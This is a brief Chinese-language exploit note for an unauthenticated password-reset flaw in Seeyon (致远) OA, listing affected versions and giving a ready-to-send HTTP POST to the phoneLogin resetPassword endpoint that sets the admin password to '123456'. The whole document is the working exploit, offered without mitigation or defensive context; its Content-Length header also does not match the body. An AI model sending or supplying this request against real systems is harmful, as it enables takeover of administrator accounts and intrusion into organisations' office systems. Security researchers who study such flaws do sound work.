# 致远OA前台任意用户密码修改漏洞

## 版本
```
Seeyon OA=V5/G6
Seeyon OA=V8.1SP2
Seeyon OA=V8.2
```
## exp
```
POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
Host: ip
User-Agent: Go-http-client/1.1
Content-Length: 24
Content-Type: application/json
Accept-Encoding: gzip

{"loginName":"admin","password":"123456"}
```
